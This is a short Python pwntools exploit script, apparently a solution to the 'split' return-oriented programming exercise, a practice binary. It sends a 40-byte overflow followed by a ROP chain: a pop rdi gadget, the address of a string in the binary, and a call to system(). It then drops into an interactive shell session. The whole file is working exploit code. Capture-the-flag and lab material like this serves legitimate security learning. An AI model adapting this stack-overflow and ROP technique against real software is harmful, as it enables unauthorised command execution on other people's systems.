from pwn import *
p = process("./split")
payload = p64(0x4007c3) # pop rdi; ret
payload += p64(p.elf.sym['usefulString']) # addr of useful string
payload += p64(0x40074B) # system()
p.sendline(b'A'*(0x20+8) + payload)
p.interactive()
